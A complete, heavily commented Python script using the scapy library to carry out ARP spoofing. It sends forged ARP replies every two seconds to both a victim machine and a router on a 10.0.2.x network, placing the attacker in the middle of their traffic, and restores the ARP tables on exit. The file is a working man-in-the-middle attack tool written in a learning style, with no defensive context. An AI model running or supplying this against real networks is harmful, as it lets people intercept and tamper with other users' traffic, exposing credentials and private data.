
import scapy.all as scapy
import time

#Creating a function to get the mac address of router 
def get_mac(ip):
    #creating a arp request by calling the ARP() method from scapy and create a object called arp_request
    arp_request = scapy.ARP(pdst=ip)
    #Alternate for ⬆ ⬆ ⬆
    #arp_request = scapy.ARP()
    #Accessing the pdst attribute inside the ARP() method to enter the ip for the arp request
    #arp_request.pdst = ip


    #creating object called broadcast and creating a broadcast request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    
    #Alternate for ⬆ ⬆ ⬆
    #broadcast = scapy.Ether() 
    #Accessing the pdst attribute inside the Ether() method to enter the broadcast for the broadcast request
    #broadcast = "ff:ff:ff:ff:ff:ff"

    #Append both request inside the arp_request_broadcast
    arp_request_broadcast = broadcast/arp_request

    #creating two objects online and offline for reciving the respone form the scapy.srp() method
    #online=> clients that are alive or connected to the specfied ip
    #offline=> no response from the specfied ip
    #timeout=> To move to next request if there is no response
    #verbose=> To show less detail 
    online, offline= scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    
    #returning the mac address of ip 
    return online[0][1].hwsrc


#Creating a function to spoof the both viticm and router
def spoof(target_ip, spoof_ip):
    #Calling the get_mac function and storing the value in the target_mac
    target_mac = get_mac(target_ip)

    #Creating a response 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    #Sending a response
    scapy.send(packet, verbose=False)

#Creating to a function to restore everything back to original form
def restore(dest_ip, source_ip):
    destination_mac = get_mac(dest_ip)
    src_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

#---------------------------------------------execption handling------------------------------------------------
#trying this blocks of code until something interrupt
try:
    
    packet_send = 0
    #while something is True than keep this block of code running 
    while True:

        #calling the spoof function twice to spoof both viticm and router
        spoof("10.0.2.19", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.19")

        packet_send+=2
        print(f"\r[+] Packet send : {packet_send}", end="")

        #The time method let the response to wait for every 2 seconds and again send the response
        time.sleep(2)

#if something interrupt than execute this block of code
except KeyboardInterrupt :

    print("\nCTRL + C Detecded..........Qutting")
    
    #calling the restore function to restore both viticm and router to original state
    restore("10.0.2.19", "10.0.2.1")
    restore("10.0.2.1", "10.0.2.19")